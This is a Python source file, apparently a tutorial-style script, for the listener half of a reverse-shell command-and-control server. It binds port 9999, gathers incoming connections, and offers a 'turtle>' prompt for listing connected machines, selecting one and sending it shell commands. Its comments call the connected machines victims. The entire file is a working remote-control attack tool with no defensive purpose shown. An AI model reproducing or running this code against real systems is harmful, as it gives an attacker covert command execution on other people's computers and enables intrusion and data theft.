import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close() #deletes all communication if the program is retarted

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept() #accept all the connections
            s.setblocking(1)  # prevents timeout

            all_connections.append(conn)#add all connections to the list of collections
            all_address.append(address)#add all adderess to the list of address

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir


def start_turtle(): #starting the command prompt

    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")


# Display all current active connections with client

def list_connections():
    results = ''

    for i, conn in enumerate(all_connections): #loop through all the connections
        try:
            conn.send(str.encode(' ')) #send a dummy request
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i] #delete all connections a nd address if the connection didnt reply the dumy request
            continue #after the del function , leave the loop

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target) #change target to int
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit': 
                break
            if len(str.encode(cmd)) > 0:#encode message being sent to client
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS): #thread creation
        t = threading.Thread(target=work)
        t.daemon = True #if target is closed end thread
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work(): #after notifying tht they would be two threads,create them
    while True:
        x = queue.get()
        if x == 1: #the first thread do the following
            create_socket()#create socket
            bind_socket()#bind socket
            accepting_connections()#accept all connections
        if x == 2:
            start_turtle()# secong thread,start command rompt (turtle)

        queue.task_done()#end task after all is done


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)#creating jobs and putting them in queue

    queue.join()#thread takes request from a queue not a list


create_workers()# call the two function by which other functions are embedded in
create_jobs()